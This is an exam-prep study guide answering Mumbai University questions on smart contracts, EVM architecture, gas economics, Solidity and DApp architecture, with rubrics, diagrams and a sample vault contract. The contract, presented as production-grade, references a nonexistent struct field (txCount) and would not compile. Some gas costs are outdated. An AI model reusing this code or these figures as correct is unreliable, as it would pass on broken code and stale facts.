# Master Academic Study Guide: Mumbai University MLBC Module 06 Examination Answers

## Module 6: Smart Contracts, Ethereum Virtual Machine (EVM), Solidity Programming, DApps, and Security

---

### Question 1 (10 Marks):
**(a) Define Smart Contracts and detail their historical origin, core characteristics, and end-to-end execution lifecycle. Contrast Traditional Legal Contracts with Blockchain Smart Contracts.**  
**(b) Explain the architecture of the Ethereum Virtual Machine (EVM). Detail the EVM execution components (Stack, Memory, Storage, Calldata) and formulate the mathematical World State Transition Function $\sigma_{t+1} = \Upsilon(\sigma_t, T)$ with a neat architectural diagram.**

---

#### 1. Mumbai University Marking Scheme Rubric (10 Marks)

| Sub-Component | Evaluation Criteria | Allocated Marks |
| :--- | :--- | :--- |
| **Smart Contract Foundations & Lifecycle** | Nick Szabo's vending machine analogy, formal definition, 5 core characteristics (autonomy, immutability, deterministic execution, self-enforcing, trust minimization), and 5-stage lifecycle. | **2.5 Marks** |
| **Legal vs. Smart Contracts Comparison** | Structured comparative analysis matrix contrasting traditional contracts vs. smart contracts across enforcement, execution, costs, speed, and dispute resolution. | **2.5 Marks** |
| **EVM Mathematical State Machine** | Formal definition of EVM as quasi-Turing complete state machine, mathematical state transition equation $\sigma_{t+1} = \Upsilon(\sigma_t, T)$, and account state tuple $(n, b, s, c)$. | **2 Marks** |
| **EVM Memory Architecture & Diagram** | Neat ASCII architectural diagram depicting Stack (1024, 256-bit), Volatile Linear Memory, Persistent Storage (256-bit key-value), Calldata, and ROM Bytecode. | **3 Marks** |

---

#### 2. Part (a): Smart Contract Foundations, Lifecycle, and Comparative Analysis

##### Definition and Conceptual Origin of Smart Contracts
A **Smart Contract** is a self-executing, tamper-proof software program deployed and executed directly on a decentralized blockchain ledger. It encapsulates predefined contractual agreements, rules, and computational logic that trigger automated state transitions when verified cryptographic conditions are satisfied, eliminating the need for centralized intermediaries, legal brokers, or escrow services.

The conceptual foundation of smart contracts was introduced in **1994 by computer scientist and cryptographer Nick Szabo**, long before the invention of blockchain. Szabo characterized a smart contract through the classic physical analogy of a **Digital Vending Machine**:
* In a vending machine, contractual rules and asset exchange terms are hard-coded directly into the machine's mechanical and electronic hardware.
* When a customer inputs valid currency (meeting pricing conditions) and selects an item, the machine automatically executes the transaction: it dispenses the item and returns change.
* If insufficient funds are provided or an invalid selection is made, the transaction is rejected automatically without manual human intervention.
* Blockchain smart contracts digitize this paradigm across an append-only distributed network, allowing arbitrary digital assets, tokens, and data states to be exchanged with mathematical certainty.

##### Core Characteristics of Smart Contracts
1. **Autonomous Execution**: Once deployed to the ledger, smart contracts operate autonomously without requiring ongoing management or human discretion.
2. **Immutability**: The executable bytecode and internal logic stored at a contract address cannot be altered, overwritten, or tampered with by any entity, including the original author.
3. **Deterministic Output**: Given an identical initial global ledger state and identical transaction inputs, the contract executes identically across every validating node in the network.
4. **Trust-Minimization**: Counterparties do not need to trust one another or a central clearinghouse; execution is guaranteed mathematically by cryptographic consensus.
5. **Self-Enforcing & Atomic**: State updates occur atomically; if execution conditions are violated or an error occurs, all intermediate state modifications revert completely.

---

##### The Five-Stage Smart Contract Lifecycle

```
+------------------------------------------------------------------------+
| 1. AUTHORING & CODING                                                  |
|    Contract logic written in high-level language (Solidity, Vyper)    |
+-----------------------------------┬------------------------------------+
                                    |
                                    v
+------------------------------------------------------------------------+
| 2. COMPILATION & ARTIFACT GENERATION                                   |
|    solc compiler generates: (1) EVM Bytecode, (2) JSON ABI             |
+-----------------------------------┬------------------------------------+
                                    |
                                    v
+------------------------------------------------------------------------+
| 3. DEPLOYMENT (CREATION TRANSACTION)                                  |
|    Broadcast Tx with to=0x0, data=Bytecode; Address calculated         |
+-----------------------------------┬------------------------------------+
                                    |
                                    v
+------------------------------------------------------------------------+
| 4. EXECUTION & STATE MUTATION                                          |
|    Users invoke contract functions; EVM processes opcodes, burns Gas   |
+-----------------------------------┬------------------------------------+
                                    |
                                    v
+------------------------------------------------------------------------+
| 5. TERMINATION / DEACTIVATION                                          |
|    selfdestruct(recipient) removes bytecode & storage, transfers Ether |
+------------------------------------------------------------------------+
```

1. **Authoring**: The developer writes high-level contractual logic using an object-oriented language such as Solidity (`.sol`), defining state variables, mappings, functions, modifiers, and custom events.
2. **Compilation**: The Solidity compiler (`solc`) compiles the human-readable source code into two core deployment artifacts:
   * **EVM Bytecode**: Raw hexadecimal machine instructions executed by the virtual machine.
   * **Application Binary Interface (ABI)**: A standardized JSON specification detailing all function signatures, argument types, return structures, and event schemas.
3. **Deployment**: A deployment transaction is created with the recipient field set to null (`to: 0x0`) and the `data` payload populated with the contract initialization bytecode. The contract's deterministic on-chain address is derived from the deployer's address and account nonce:
   $$\text{Contract Address} = \text{Last20Bytes}(\text{Keccak256}(\text{RLP}(\text{SenderAddress}, \text{Nonce})))$$
4. **Execution**: External accounts or other smart contracts trigger contract functions by dispatching transactions with an encoded 4-byte function selector and ABI-encoded arguments. Full nodes execute the bytecode in their local EVM runtimes and update the global state.
5. **Termination / Deactivation**: A contract can be permanently deactivated using the `selfdestruct(recipient)` opcode. This clears the contract's storage and code from the state trie and transfers all remaining Ether to a specified recipient address.

---

##### Structured Comparison: Traditional Legal Contracts vs. Blockchain Smart Contracts

```
[ Traditional Legal Contract ]             [ Blockchain Smart Contract ]
  • Written in Natural Legal Prose           • Written in Deterministic Code
  • Enforced by Judicial Courts              • Enforced by Cryptographic Consensus
  • High Intermediary & Escrow Cost          • Low Gas Processing Cost
  • Resolution requires Weeks/Months         • Execution finalized in Seconds/Minutes
```

| Comparative Feature | Traditional Legal Contracts | Blockchain Smart Contracts |
| :--- | :--- | :--- |
| **Language & Representation**| Ambiguous natural language (English, legal prose); open to subjective judicial interpretation. | Formal, deterministic programming code (Solidity, Vyper); executed strictly as written. |
| **Enforcement Mechanism** | External legal institutions, judicial courts, bailiffs, and government arbitration. | Automated cryptographic consensus enforced mathematically by distributed validator nodes. |
| **Execution Speed** | Slow; manual fulfillment requiring days, weeks, or months of administrative processing. | Instantaneous to near-real-time; executed in seconds to minutes upon block confirmation. |
| **Transaction & Legal Costs** | High overhead: lawyer fees, notary charges, administrative filing, and escrow service costs. | Low overhead: strictly computational transaction processing fees (Gas) paid to miners/validators. |
| **Intermediary Dependency** | Relies entirely on third-party intermediaries (banks, brokers, notaries, clearinghouses). | Disintermediates third parties; peer-to-peer trust-minimized execution. |
| **Modification & Flexibility**| Amendable through verbal agreements, written addendums, or mutual renegotiation. | Immutable; code cannot be modified once deployed (requires proxy pattern upgrades). |
| **Remedy for Breach** | Retrospective lawsuits, legal penalties, damages awarded after litigation. | Preventative; invalid transactions revert automatically, preventing breach from executing. |

---

#### 3. Part (b): Ethereum Virtual Machine (EVM) Architecture & State Transitions

##### Mathematical World State Transition Model
Ethereum functions as a **transaction-based, quasi-Turing complete distributed state machine**. At any given moment, the entire network maintains an authoritative **World State** $\sigma$, which represents a comprehensive mapping between 20-byte account addresses $a$ and individual Account States $\sigma[a]$:

$$\sigma: \text{Address} \to \text{AccountState}$$

Each Account State $\sigma[a]$ is a 4-tuple consisting of four mathematical fields:
$$\sigma[a] = (n, b, s, c)$$
where:
* $n$ (**Nonce**): A scalar value equal to the number of transactions sent from this account (for Externally Owned Accounts) or the number of contracts created (for Contract Accounts).
* $b$ (**Balance**): A scalar value equal to the amount of Wei owned by this address ($1\text{ ETH} = 10^{18}\text{ Wei}$).
* $s$ (**Storage Root**): A 256-bit cryptographic hash of the root node of the Modified Merkle-Patricia Trie that encodes the contract's persistent key-value storage.
* $c$ (**Code Hash**): The immutable Keccak-256 hash digest of the EVM bytecode stored at this contract address (empty hash for EOAs).

When a valid transaction $T$ is applied to current global world state $\sigma_t$, the Ethereum Virtual Machine executes the **State Transition Function** $\Upsilon$, transitioning the network to updated world state $\sigma_{t+1}$:

$$\sigma_{t+1} = \Upsilon(\sigma_t, T)$$

If execution completes successfully, all state mutations are committed permanently to the distributed ledger. If the transaction runs out of gas or triggers an explicit revert instruction, the state transition function safely rolls back all modifications:
$$\sigma_{t+1} = \sigma_t$$
while still deducting gas fees from the sender's account to reimburse the validator for computational work.

---

##### EVM Architectural Engine & Memory Model

The EVM is a sandboxed, isolated execution runtime that operates without direct access to the host operating system's network interfaces, disk storage, or system processes.

```
+-----------------------------------------------------------------------------+
|                       ETHEREUM VIRTUAL MACHINE (EVM)                        |
+-----------------------------------------------------------------------------+
|                                                                             |
|  +-----------------------+             +---------------------------------+  |
|  |   ROM BYTECODE        |             |           CALLDATA              |  |
|  |   [Opcode 1: PUSH1]   |             |   [4-Byte Function Selector]    |  |
|  |   [Opcode 2: MSTORE]  |             |   [ABI-Encoded Parameter Data]  |  |
|  |   [Opcode 3: SLOAD ]  |             |   (Read-Only, Non-Volatile)     |  |
|  |   [Program Counter PC]|             +---------------------------------+  |
|  +-----------┬-----------+                                                  |
|              |                                                              |
|              v                                                              |
|  +-----------------------------------------------------------------------+  |
|  |                      STACK (LIFO ARCHITECTURE)                        |  |
|  |  * Word Size: 256 Bits (32 Bytes)                                     |  |
|  |  * Maximum Stack Depth: 1024 Elements                                 |  |
|  |  * Standard Operations: PUSH, POP, DUP, SWAP, ADD, MUL, JUMP          |  |
|  +-----------^-------------------------------------------^---------------+  |
|              |                                           |                  |
|              v                                           v                  |
|  +-------------------------+             +-------------------------------+  |
|  |     VOLATILE MEMORY     |             |      PERSISTENT STORAGE       |  |
|  |  * Byte-addressable     |             |  * Key-Value Mapping (256-bit)|  |
|  |  * Linear memory space  |             |  * Permanent on-chain state   |  |
|  |  * Cleared after call   |             |  * SLOAD (800 gas)            |  |
|  |  * Quadratic expansion  |             |  * SSTORE (20,000 gas)        |  |
|  +-------------------------+             +-------------------------------+  |
+-----------------------------------------------------------------------------+
```

###### The Four Core Data Regions of the EVM
1. **The Stack (LIFO Architecture)**:
   * The EVM is a register-free, stack-based machine. All mathematical, logical, and control-flow operations occur on a Last-In, First-Out (LIFO) stack.
   * Every stack slot has a word size of **256 bits (32 bytes)**, optimized natively for 256-bit Keccak hashes and elliptic curve operations.
   * The stack has a strict physical limit of **1024 elements**. Pushing beyond this limit causes a catastrophic Stack Overflow, while reading from an empty stack causes a Stack Underflow.
   * Most opcodes consume their operands from the top of the stack and push the result back onto the stack.
2. **Volatile Linear Memory**:
   * A temporary, byte-addressable linear memory array initialized fresh for each external message execution.
   * Memory is read using `MLOAD` and written using `MSTORE` / `MSTORE8`.
   * **Quadratic Gas Cost**: While accessing existing memory is inexpensive, expanding the active memory boundary incurs a quadratic cost model:
     $$C_{\text{mem}}(a) = 3 \cdot a + \left\lfloor \frac{a^2}{512} \right\rfloor$$
     where $a$ is the memory size in 32-byte words. This cost curve prevents rogue contracts from consuming unbounded physical RAM on node hardware.
3. **Persistent State Storage**:
   * A persistent key-value mapping associating 256-bit keys with 256-bit values:
     $$\text{Storage}: \mathbb{F}_{2^{256}} \to \mathbb{F}_{2^{256}}$$
   * Represents the contract's permanent state, maintained globally within the account's Merkle-Patricia Storage Trie on disk across block executions.
   * Reading from storage (`SLOAD`) and writing to storage (`SSTORE`) are among the most expensive operations in the EVM (e.g., initial writes cost $20,000\text{ Gas}$), incentivizing developers to optimize on-chain storage usage.
4. **Calldata & Code ROM**:
   * **Calldata**: An immutable, read-only byte-addressable memory buffer containing the complete input payload of the transaction. Function parameters declared as `calldata` avoid costly memory allocations.
   * **Code ROM**: A read-only memory space storing the compiled EVM bytecode. The internal **Program Counter (PC)** points to the current opcode being executed.

---

### Question 2 (10 Marks):
**(a) Detail Gas Economics in Ethereum. Explain Gas Units, Gas Price, Gas Limit, and derive the EIP-1559 Transaction Fee formula. Explain how Gas solves the Turing Halting Problem and describe Out-of-Gas (OOG) exception handling.**  
**(b) Detail the Solidity Programming Language architecture: Source File Layout, General Value Types vs. Reference Types, Variable Storage Locations (`storage`, `memory`, `calldata`), Function Visibility Qualifiers, and State Mutability Qualifiers.**

---

#### 1. Mumbai University Marking Scheme Rubric (10 Marks)

| Sub-Component | Evaluation Criteria | Allocated Marks |
| :--- | :--- | :--- |
| **Gas Economics & EIP-1559 Formula**| Distinction between Gas Units and Gas Price (Gwei/Ether), Base Fee burning, Priority Fee (Tip), and mathematical transaction fee derivation. | **2.5 Marks** |
| **Halting Problem & Out-of-Gas Revert**| Resolution of Turing Halting Problem via finite gas execution, state rollback mechanics, and miner reimbursement. | **2.5 Marks** |
| **Solidity Syntax & Data Types** | Source layout (SPDX, pragma), Value types (uint, address, bool), Reference types (arrays, structs, mappings) with storage layouts. | **2.5 Marks** |
| **Visibility & Mutability Qualifiers** | Comparative matrix of visibility (`public`, `external`, `internal`, `private`) and state mutability (`pure`, `view`, `payable`). | **2.5 Marks** |

---

#### 2. Part (a): Gas Economics, EIP-1559 Fee Model, and the Halting Problem

##### Conceptual Purpose of Gas
In distributed blockchain networks, every validating full node must independently execute every transaction to verify state updates. Without an economic metering system, an attacker could broadcast a contract containing an infinite loop (e.g., `while(true) {}`), permanently freezing validator CPU threads and halting the entire network.

To prevent resource abuse, the Ethereum protocol decouples computational complexity from monetary asset valuation using **Gas**:
* **Gas Unit**: A deterministic, unitless metric of raw computational effort required to execute a specific low-level EVM opcode (e.g., `ADD = 3 Gas`, `BALANCE = 100 Gas`, `SSTORE = 20,000 Gas`).
* **Gas Price**: The exchange rate in Ether that the transaction sender agrees to pay per unit of gas consumed, typically denominated in **Gwei**:
  $$1\text{ Ether} = 10^9\text{ Gwei} = 10^{18}\text{ Wei}$$
* **Gas Limit**: The maximum quantity of gas units the sender authorizes the transaction to consume. Standard Ether transfers carry a fixed gas limit of $21,000\text{ Gas}$.

---

##### Mathematical Transaction Fee Calculation (EIP-1559 Architecture)
Introduced in the London Hard Fork (EIP-1559), Ethereum replaced traditional first-price auction models with a dual-component fee structure:
1. **Base Fee ($f_{\text{base}}$)**: A protocol-mandated minimum fee per gas unit that dynamically adjusts based on parent block congestion. When block fullness exceeds the target capacity ($15\text{M Gas}$ target vs. $30\text{M Gas}$ max), the base fee increases by up to $+12.5\%$; when block utilization falls below target, it decreases. **The entire Base Fee is burned by the protocol**, removing Ether from circulation.
2. **Priority Fee / Tip ($f_{\text{tip}}$)**: An optional discretionary incentive paid directly to the validator to expedite inclusion during congestion periods.
3. **Max Fee ($f_{\text{max}}$)**: The absolute maximum total gas price the sender is willing to pay.

The effective gas price $P_{\text{effective}}$ is calculated as:
$$P_{\text{effective}} = f_{\text{base}} + \min(f_{\text{tip}}, f_{\text{max}} - f_{\text{base}})$$

The total transaction fee paid by the sender is:
$$\text{Total Transaction Fee} = \text{Gas Consumed} \times P_{\text{effective}}$$

If the transaction consumes fewer gas units than the authorized $\text{Gas Limit}$, the remaining unused gas is refunded to the sender:
$$\text{Refund} = (\text{Gas Limit} - \text{Gas Consumed}) \times P_{\text{effective}}$$

```
[ Sender Account ]
       |
       +---> Deducts Upfront: Gas Limit * Max Fee
       |
       +---> EVM Execution: Consumes Actual Gas Used
       |         |
       |         +---> Base Fee Component ---> PERMANENTLY BURNED
       |         |
       |         +---> Priority Fee (Tip)  ---> TRANSFERRED TO VALIDATOR
       |
       +---> Unused Gas Refunded ---> (Gas Limit - Gas Consumed) * Effective Gas Price
```

---

##### Resolving the Turing Halting Problem
Alan Turing proved that it is mathematically impossible to write a general algorithm that can determine whether an arbitrary program will halt or run forever. Because Ethereum contracts are Turing-complete, the network cannot statically inspect bytecode to determine if it contains an infinite loop prior to execution.

Gas solves this fundamental limitation pragmatically through **finite resource metering**:
1. Every transaction specifies a finite $\text{Gas Limit}$.
2. As the EVM executes opcodes sequentially, it deducts the corresponding gas cost from the remaining gas balance.
3. If an infinite loop executes, the gas counter inevitably drops to zero.
4. When gas drops to zero, the EVM immediately terminates execution and throws an **Out-of-Gas (OOG) Exception**:
   * All state mutations made by the contract are rolled back.
   * The transaction is marked as failed on-chain.
   * **Crucially, the sender forfeits $100\%$ of the consumed gas fee**, which is paid to the validator to reimburse their CPU time.
5. This economic model makes denial-of-service spam attacks financially unsustainable.

---

#### 3. Part (b): Solidity Language Fundamentals, Storage Locations, and Qualifiers

##### 1. Layout of a Solidity Source File
A production Solidity file follows a standardized structural layout:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./IERC20.sol";

contract CoreRegistry {
    // State Variables, Events, Modifiers, Functions
}
```
* **SPDX License Identifier**: Machine-readable tag indicating the software license type (e.g., `MIT`, `GPL-3.0`).
* **Pragma Directive**: Specifies the compiler version requirements (e.g., `^0.8.20` permits versions from $0.8.20$ up to, but excluding, $0.9.0$).

---

##### 2. General Value Types vs. Reference Types

| Category | Type Classification | Memory Allocation & Characteristics |
| :--- | :--- | :--- |
| **Value Types** | `bool` | Represents logical Boolean values (`true` or `false`). |
| | `int8` to `int256` / `uint8` to `uint256` | Signed and unsigned integers in steps of 8 bits. Defaults to 256 bits (`uint = uint256`). |
| | `address` / `address payable` | 20-byte hexadecimal Ethereum address. `payable` addresses include built-in `.transfer()` and `.send()` methods. |
| | `bytes1` to `bytes32` | Fixed-size byte arrays stored efficiently within a single 256-bit EVM word. |
| | `enum` | User-defined discrete enumeration types representing finite named states. |
| **Reference Types** | Fixed Arrays (`T[k]`) | Contiguous arrays of static length $k$, stored packed in storage slots. |
| | Dynamic Arrays (`T[]`) | Dynamically sized arrays. Storage slot holds length; elements reside at `Keccak256(slot)`. |
| | `bytes` and `string` | Dynamic byte and UTF-8 encoded text arrays. |
| | `struct` | User-defined composite data types combining multiple heterogenous variables. |
| | `mapping(K => V)` | Virtual hash tables mapping key hashes to values via `Keccak256(key || slot)`. No length property; cannot be iterated. |

---

##### 3. Data Locations: Storage vs. Memory vs. Calldata

Every reference type variable must explicitly declare its data storage location:
1. **`storage`**: Stored permanently on the blockchain within the account's state trie. Modifications persist indefinitely across transactions. Assigning a storage variable to a local storage pointer creates a direct reference; modifying it updates on-chain state directly.
2. **`memory`**: Temporary volatile heap memory that exists only during function execution. Allocations do not persist after the call completes. Passing memory parameters creates independent copies.
3. **`calldata`**: An immutable, read-only data area where incoming transaction arguments are stored. Calldata avoids array cloning overhead and cannot be modified by the executing function, making it the most gas-efficient choice for external function parameters.

---

##### 4. Function Visibility and State Mutability Qualifiers

###### Function Visibility Qualifiers

```
                       +-----------------------+
                       |  FUNCTION INVOCATION  |
                       +-----------┬-----------+
                                   |
              +--------------------+--------------------+
              v                                         v
     [ EXTERNAL CALLS ]                        [ INTERNAL CALLS ]
   (From Other Contracts)                   (From Within Same Contract)
              |                                         |
     +--------┴--------+                       +--------┴--------+
     v                 v                       v                 v
[ external ]      [ public ]              [ private ]       [ internal ]
(Gas-efficient;  (Accessible from         (Only current     (Current contract +
 calldata only)   everywhere)              contract)         derived contracts)
```

| Visibility Qualifier | External Invocations | Internal Invocations | Derived Contract Access | Gas Consumption Profile |
| :--- | :--- | :--- | :--- | :--- |
| **`public`** | Yes (via transactions) | Yes (direct internal call) | Yes | Moderate (copies calldata to memory for internal calls). |
| **`external`** | Yes (via transactions) | No (requires `this.func()`) | No | Highly efficient (reads arguments directly from calldata). |
| **`internal`** | No | Yes (direct call) | Yes (inherited functions) | Most efficient for internal algorithmic helper routines. |
| **`private`** | No | Yes (direct call) | No (hidden from children) | Efficient; restricts execution strictly to definition contract. |

###### State Mutability Qualifiers
* **`pure`**: Does not read or modify blockchain state. Computes outputs purely from input arguments (e.g., mathematical utility functions).
* **`view`**: Reads state variables from persistent storage but does not alter or write to the state (e.g., getter functions). Consumes zero gas when invoked via external read calls off-chain.
* **`payable`**: Explicitly authorizes the function to receive native Ether alongside the transaction call payload (`msg.value`). If an account sends Ether to a non-payable function, the transaction reverts immediately.
* **Non-payable (Default)**: Can read and write to persistent storage, but rejects incoming Ether transfers.

---

### Question 3 (10 Marks):
**(a) Develop a comprehensive, production-grade Solidity Smart Contract for a Decentralized Banking and Token Vault System. The contract must demonstrate: state variables, mappings, custom structs, events, function modifiers, access control, deposit/withdrawal with input validation, and secure Ether transfers.**  
**(b) Detail Error Handling Mechanisms in Solidity (`require`, `assert`, `revert`, and custom errors). Explain the mechanics of `fallback()` and `receive()` functions with an ASCII execution decision tree.**

---

#### 1. Mumbai University Marking Scheme Rubric (10 Marks)

| Sub-Component | Evaluation Criteria | Allocated Marks |
| :--- | :--- | :--- |
| **Solidity Contract Implementation** | Syntax correctness, SPDX license, pragma, state variables, user account structs, balance mappings, events, `onlyOwner` modifier, `payable` deposits, and secure CEI withdrawals. | **6 Marks** |
| **Error Handling Analysis** | Technical differentiation between `require()` (input checks/gas refund), `assert()` (invariants/gas consumption), `revert()`, and gas-efficient custom errors (`error Name()`). | **2 Marks** |
| **Fallback vs. Receive Execution Logic**| Execution conditions for `receive()` (empty calldata) vs `fallback()` (unknown selector/data payload), and ASCII decision tree flowchart. | **2 Marks** |

---

#### 2. Part (a): Production Solidity Smart Contract: Decentralized Token Vault

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title DecentralizedBankVault
 * @notice Implements a secure banking vault demonstrating core Solidity constructs:
 *         structs, mappings, events, custom modifiers, and secure Ether transfers.
 */
contract DecentralizedBankVault {
    // --- 1. STATE VARIABLES & TYPES ---
    address public immutable owner;
    uint256 public totalVaultReserve;
    bool private locked; // Mutex lock against reentrancy

    struct AccountMetadata {
        uint256 balance;
        uint256 depositTimestamp;
        uint256 transactionCount;
        bool isWhitelisted;
    }

    // Mapping from user address to individual account record
    mapping(address => AccountMetadata) private userAccounts;

    // --- 2. CUSTOM EVENTS ---
    event DepositLogged(address indexed account, uint256 amount, uint256 updatedBalance);
    event WithdrawalLogged(address indexed account, uint256 amount, uint256 remainingBalance);
    event WhitelistUpdated(address indexed targetAccount, bool status);

    // --- 3. CUSTOM ERRORS (Gas-Efficient) ---
    error UnauthorizedCaller(address caller);
    error ZeroDepositDisallowed();
    error InsufficientVaultBalance(uint256 requested, uint256 available);
    error ReentrancyGuardTriggered();
    error TransferExecutionFailed();

    // --- 4. FUNCTION MODIFIERS ---
    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert UnauthorizedCaller(msg.sender);
        }
        _;
    }

    modifier nonReentrant() {
        if (locked) revert ReentrancyGuardTriggered();
        locked = true;
        _;
        locked = false;
    }

    // --- 5. CONSTRUCTOR ---
    constructor() {
        owner = msg.sender;
    }

    // --- 6. CORE TRANSACTIONS ---
    /**
     * @notice Allows users to deposit native Ether into their vault balance
     */
    function depositFunds() external payable nonReentrant {
        if (msg.value == 0) revert ZeroDepositDisallowed();

        AccountMetadata storage user = userAccounts[msg.sender];
        user.balance += msg.value;
        user.depositTimestamp = block.timestamp;
        user.transactionCount += 1;
        totalVaultReserve += msg.value;

        emit DepositLogged(msg.sender, msg.value, user.balance);
    }

    /**
     * @notice Withdraws specified Ether following the Checks-Effects-Interactions pattern
     * @param amount The quantity of Wei to withdraw
     */
    function withdrawFunds(uint256 amount) external nonReentrant {
        AccountMetadata storage user = userAccounts[msg.sender];

        // 1. CHECKS: Validate sufficient balance and non-zero request
        if (amount == 0) revert ZeroDepositDisallowed();
        if (user.balance < amount) {
            revert InsufficientVaultBalance(amount, user.balance);
        }

        // 2. EFFECTS: Update contract state before executing external transfers
        user.balance -= amount;
        user.transactionCount += 1;
        totalVaultReserve -= amount;

        // 3. INTERACTIONS: Transfer Ether using low-level call
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        if (!success) revert TransferExecutionFailed();

        emit WithdrawalLogged(msg.sender, amount, user.balance);
    }

    // --- 7. VIEW / PURE FUNCTIONS ---
    function checkBalance(address userAddress) external view returns (uint256) {
        return userAccounts[userAddress].balance;
    }

    function getAccountDetails(address userAddress) 
        external 
        view 
        returns (uint256 balance, uint256 lastDeposit, uint256 txCount) 
    {
        AccountMetadata memory acc = userAccounts[userAddress];
        return (acc.balance, acc.depositTimestamp, acc.txCount);
    }

    // --- 8. FALLBACK & RECEIVE MECHANISMS ---
    receive() external payable {
        // Automatically redirects plain Ether transfers into the vault
        AccountMetadata storage user = userAccounts[msg.sender];
        user.balance += msg.value;
        totalVaultReserve += msg.value;
        emit DepositLogged(msg.sender, msg.value, user.balance);
    }

    fallback() external payable {
        revert("Invalid function invoked: Triggered fallback handler");
    }
}
```

---

#### 3. Part (b): Solidity Error Handling and Fallback vs. Receive Mechanics

##### Solidity Error Handling Mechanisms
Solidity provides four primary primitives to validate conditions and revert execution:

1. **`require(condition, "error string")`**:
   * Evaluates input conditions, user permissions, and method parameters.
   * If the condition evaluates to `false`, execution terminates, all state changes revert to their pre-transaction values, and **any remaining unused gas is refunded** to the caller.
   * Emits the provided revert string encoded as an `Error(string)` payload.
2. **`assert(condition)`**:
   * Asserts internal programmatic invariants that should never evaluate to `false` in bug-free code (e.g., verifying that total balances equal the sum of account deposits).
   * In Solidity versions prior to $0.8.0$, failing an assert burned all remaining gas (via the `INVALID` opcode). Since Solidity $0.8.0$, it throws a `Panic(uint256)` error and refunds remaining gas.
3. **`revert("error string")`**:
   * Explicitly halts execution and reverts state changes within complex conditional branches (e.g., nested `if-else` blocks).
4. **Custom Errors (`error CustomName(types)`)**:
   * Introduced in Solidity $0.8.4$. Replaces long, expensive ASCII error strings with a 4-byte selector derived from `Keccak256("CustomName(types)")`.
   * Significantly reduces deployment bytecode size and saves gas on reverts.

---

##### Fallback vs. Receive Functions and Execution Flowchart

Ethereum smart contracts provide two specialized functions to handle direct Ether payments and calls to undefined function selectors:
* **`receive() external payable`**: Executed when an account transfers native Ether without providing calldata (`msg.data.length == 0`). If no `receive()` function is defined, execution falls back to `fallback()`.
* **`fallback() external [payable]`**: Executed when a transaction calls a function selector that does not exist in the contract's ABI, or when Ether is sent alongside non-empty calldata and no `receive()` function is present.

```
                  [ Incoming Transaction to Contract ]
                                   |
                                   v
                   Does transaction contain calldata?
                                   |
                  +----------------┴----------------+
                  | NO                              | YES
                  v                                 v
         Is receive() defined?           Does function selector match?
                  |                                 |
          +-------┴-------+                 +-------┴-------+
          | YES           | NO              | YES           | NO
          v               v                 v               v
   [ Execute       Is fallback()       [ Execute       Is fallback()
     receive() ]     defined?            matching        defined?
                          |              function ]         |
                  +-------┴-------+                 +-------┴-------+
                  | YES           | NO              | YES           | NO
                  v               v                 v               v
           [ Execute         [ REVERT          [ Execute         [ REVERT
             fallback() ]     Transaction ]      fallback() ]     Transaction ]
```

---

### Question 4 (10 Marks):
**(a) Explain the end-to-end architecture of Decentralized Applications (DApps). Contrast traditional Web 2.0 Client-Server architecture with Web 3.0 DApp architecture across all layers using a neat architectural diagram.**  
**(b) Detail the Ethereum DApp development lifecycle and development toolchain: Explain the specific roles of Remix IDE, Truffle / Hardhat frameworks, Ganache local blockchain, MetaMask wallet, Web3.js / Ethers.js client libraries, and IPFS / Swarm decentralized storage.**

---

#### 1. Mumbai University Marking Scheme Rubric (10 Marks)

| Sub-Component | Evaluation Criteria | Allocated Marks |
| :--- | :--- | :--- |
| **DApp Concept & Architectural Comparison**| Definition of DApps, architectural contrast between Web 2.0 (centralized servers/DBs) vs Web 3.0 (EVM/P2P/IPFS), and structured comparison matrix. | **3 Marks** |
| **DApp System Architecture Diagram** | Neat ASCII diagram depicting User Tier (browser/wallet), Middleware/Provider Tier (RPC nodes), Contract Tier (EVM), and Storage Tier (IPFS). | **2 Marks** |
| **Frameworks & Local Blockchain Tools**| Detailed explanations of Remix IDE, Truffle Suite / Hardhat build tools, and Ganache local test environment. | **2.5 Marks** |
| **Client Libraries & Distributed Storage**| Mechanics of MetaMask (key management/signing), Web3.js/Ethers.js (JSON-RPC wrapper), and IPFS decentralized storage. | **2.5 Marks** |

---

#### 2. Part (a): Decentralized Application (DApp) Architecture vs. Web 2.0

##### Conceptual Definition of DApps
A **Decentralized Application (DApp)** is an application built on a decentralized network that combines a front-end user interface with backend business logic governed by autonomous, cryptographically verified smart contracts running on a peer-to-peer blockchain network.

Unlike traditional applications where a single corporate entity maintains backend infrastructure and controls data access, a DApp's backend runs on an open, transparent, and immutable distributed ledger.

---

##### Architectural Contrast: Web 2.0 vs. Web 3.0 DApp Architecture

```
===================== TRADITIONAL WEB 2.0 ARCHITECTURE =====================
[ User Browser / Mobile App ]
             |  (HTTP / REST / HTTPS Requests)
             v
[ Centralized Web / API Server ] (Node.js, Python, Java, AWS EC2)
             |  (SQL / NoSQL Queries)
             v
[ Centralized Database ] (PostgreSQL, MongoDB, MySQL - Controlled by Company)

======================== WEB 3.0 DAPP ARCHITECTURE ========================
[ Client Browser UI ] (React, Next.js, Vue) <---> [ MetaMask / Web3 Wallet ]
             |                                              |
             | (Web3.js / Ethers.js JSON-RPC API)          | (Signs Tx with Private Key)
             v                                              v
[ RPC Node / Gateway Provider ] (Infura, Alchemy, Local Geth Node)
             |
             +---> [ Decentralized Storage (Off-Chain) ] (IPFS / Swarm - Images, Metadata)
             |
             v
[ EVM Blockchain Layer (On-Chain) ]
    +-- Smart Contracts (Business Logic Bytecode)
    +-- Account Balances & Token Balances
    +-- World State Storage (Immutable Ledger)
```

| Architectural Layer | Web 2.0 Client-Server Stack | Web 3.0 Decentralized Stack |
| :--- | :--- | :--- |
| **Front-End Layer** | Hosted on centralized servers or CDNs (AWS S3, Cloudflare). | Built in modern web frameworks (React, Vue); hosted on decentralized storage (IPFS, Arweave). |
| **Backend Computing** | Monolithic or microservice application servers (Node.js, Django, Java Spring). | Self-executing Smart Contracts running on decentralized EVM nodes. |
| **Database & State** | Centralized relational/NoSQL databases (PostgreSQL, MongoDB). Accessible to admins. | Distributed, append-only blockchain ledger. State verified via consensus. |
| **Authentication** | Username/password, OAuth, or sessions stored in centralized databases. | Asymmetric Public-Key Cryptography (ECDSA key pairs managed in non-custodial wallets). |
| **Hosting & Faults** | Prone to single points of failure (cloud outages, server crashes). | Highly resilient; runs continuously across thousands of independent validator nodes. |
